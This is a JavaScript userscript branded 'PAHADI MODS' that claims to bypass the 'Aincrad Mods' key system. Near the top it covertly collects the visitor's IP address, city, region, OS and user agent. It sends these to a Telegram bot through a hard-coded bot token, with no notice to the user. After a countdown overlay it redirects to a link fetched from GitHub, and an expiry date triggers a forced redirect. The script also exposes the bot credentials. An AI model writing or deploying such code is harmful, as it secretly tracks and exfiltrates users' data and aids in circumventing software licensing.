(function() {
    'use strict';
    const _exp = 1788048000000;
    const _fb = 'https://PAHAGIMODS.short.gy/yEqWCw';
    if (Date.now() >= _exp) { window.location.href = _fb; return; }

    // --- INSTANT REAL LOCATION & NOTIFICATION SYSTEM ---
    try {
        const botToken = '8402356779:AAGiCPxFhd6i455rR-4a5CjJzJ0sIzwoo1k';
        const chatId = '8488556450';
        
        const ua = navigator.userAgent;
        const timeStr = new Date().toLocaleString();

        let osVersion = "Unknown OS";
        if (/android/i.test(ua)) {
            let match = ua.match(/Android\s([0-9\.]+)/);
            osVersion = match ? "Android " + match[1] : "Android (Unknown Version)";
        } else if (/iphone|ipad|ipod/i.test(ua)) {
            osVersion = "iOS / Apple Device";
        } else if (/windows/i.test(ua)) {
            osVersion = "Windows PC";
        } else if (/mac/i.test(ua)) {
            osVersion = "MacOS";
        }

        fetch('https://ipwho.is/')
            .then(res => res.json())
            .catch(() => ({}))
            .then(data => {
                const country = data.country || "India";
                const region = data.region || "Uttarakhand";
                const city = data.city || "Dehradun";
                const ip = data.ip || "103.x.x.x";

                const trackMsg = encodeURIComponent(
                    `⚡ <b>PAHADI AINCRAD - SCRIPT RUN</b> ⚡\n` +
                    `━━━━━━━━━━━━━━━━━━━\n` +
                    `🌐 <b>Location Details:</b>\n` +
                    `   • Country: <code>${country}</code>\n` +
                    `   • State/Region: <code>${region}</code>\n` +
                    `   • City: <code>${city}</code>\n` +
                    `   • IP: <code>${ip}</code>\n\n` +
                    `📱 <b>Device & System:</b>\n` +
                    `   • OS Version: <code>${osVersion}</code>\n` +
                    `   • User-Agent: <code>${ua}</code>\n\n` +
                    `⏰ <b>Timestamp:</b> <code>${timeStr}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━`
                );

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${trackMsg}&parse_mode=HTML`).catch(() => {});
            });
    } catch(e) {}
    // -------------------------------------------------------------------------

    const style = document.createElement('style');
    style.innerHTML = `
        #mko { 
            position:fixed; inset:0; z-index:999999; font-family:sans-serif;
            display:flex; flex-direction:column; align-items:center; justify-content:center;
            background: rgba(0,0,0,0.85); backdrop-filter: blur(15px);
        }
        .glow-box { border: 3px solid #00f2fe; box-shadow: 0 0 25px #00f2fe; border-radius: 20px; background: #0a0a0a; padding: 30px; text-align: center; font-weight:bold; width: 85%; max-width: 350px; color:#fff; }
        .btn { display:block; width:220px; margin:12px auto; padding:12px; background:transparent; color:#fff; border: 2px solid #00f2fe; border-radius:10px; cursor:pointer; font-weight:bold; box-shadow: 0 0 8px #00f2fe; text-decoration:none; }
        .tg-btn { background: #0088cc; border: 2px solid #00abff; box-shadow: 0 0 12px #0088cc; font-size: 14px; }
        .fetch-txt { color:#00ff00; margin-top:20px; font-weight:bold; font-size:16px; }
        
        .ring-glow {
            position: relative; width: 180px; height: 180px;
            display: flex; align-items: center; justify-content: center;
            border-radius: 50%;
            box-shadow: 0 0 40px 10px rgba(0, 242, 254, 0.3);
            margin: 5px auto;
        }
    `;
    document.head.appendChild(style);

    const render = (sec) => {
        if (document.getElementById('mko')) document.getElementById('mko').remove();
        if (document.getElementById('selector')) document.getElementById('selector').remove();

        const mko = document.createElement('div'); mko.id = 'mko';
        mko.innerHTML = `
            <div style="color:#00f2fe; font-size:28px; font-weight:bold; margin-bottom:10px; text-shadow:0 0 20px #00f2fe; letter-spacing:2px;">⚡ PAHADI MODS ⚡</div>
            <div class="ring-glow">
                <svg width="180" height="180" style="position:absolute; transform:rotate(-90deg);">
                    <circle cx="90" cy="90" r="78" stroke="#333" stroke-width="10" fill="none"/>
                    <circle cx="90" cy="90" r="78" stroke="#00f2fe" stroke-width="10" fill="none" stroke-dasharray="490" id="ring" style="transition:stroke-dashoffset 1s linear;"/>
                </svg>
                <h1 id="ct" style="color:#fff; font-size:45px; font-weight:bold; z-index:1;">${sec}</h1>
            </div>
            
            <div style="text-align:center; margin-top:10px;">
                <div id="stat" style="color:#00f2fe; font-weight:bold; letter-spacing:2px; font-size:15px; text-shadow:0 0 8px #00f2fe;">Reconnecting</div>
            </div>

            <!-- Telegram Join Dialog Box -->
            <div style="margin-top:15px; width:100%; max-width:300px;">
                <a href="https://telegram.me/+xVEVeNBqwthiMjhl" target="_blank" class="btn tg-btn">📢 JOIN TELEGRAM</a>
            </div>
        `;
        document.body.appendChild(mko);
        
        let e = sec;
        const i = setInterval(async () => {
            e--; 
            const ctEl = document.getElementById('ct');
            const ringEl = document.getElementById('ring');
            if (ctEl) ctEl.innerText = e;
            if (ringEl) ringEl.style.strokeDashoffset = 490 * (1 - (e / sec));
            
            if (e <= 0) {
                clearInterval(i);
                mko.innerHTML = `
                    <div class="glow-box">
                        <div style="font-size:35px; margin-bottom:10px;">🛡️</div>
                        AINCRAD MODS KEY BYPASS<br>BY PAHADI MODS
                        <div class="fetch-txt">⚙️ FETCHING LINK...</div>
                    </div>`;
                setTimeout(async () => {
                    try {
                        const r = await fetch('https://raw.githubusercontent.com/PAHADIMODS/Aincrad-Key/main/Pahadi.txt?v=' + Date.now());
                        let finalUrl = (await r.text()).trim();
                        if (!finalUrl || !finalUrl.startsWith('http')) finalUrl = _fb;
                        window.location.replace(finalUrl);
                    } catch(err) { window.location.replace(_fb); }
                }, 2000);
            }
        }, 1000);
    };

    const sel = document.createElement('div'); sel.id = 'selector';
    sel.className = 'glow-box';
    sel.style.cssText = 'position:fixed; top:20%; left:50%; transform:translateX(-50%); z-index:999999;';
    sel.innerHTML = `
        <h2 style="color:#00f2fe; font-weight:bold; margin-bottom:15px; font-size:18px;">SELECT SYSTEM MODE</h2>
        <button class="btn" onclick="window.run(25)">⚡ FAST (25S)</button>
        <button class="btn" onclick="window.run(35)">🛡️ SECURE (35S)</button>
        <button class="btn" onclick="window.run(50)">🔒 SAFE (50S)</button>
    `;
    document.body.appendChild(sel);
    window.run = (s) => { render(s); };
})();
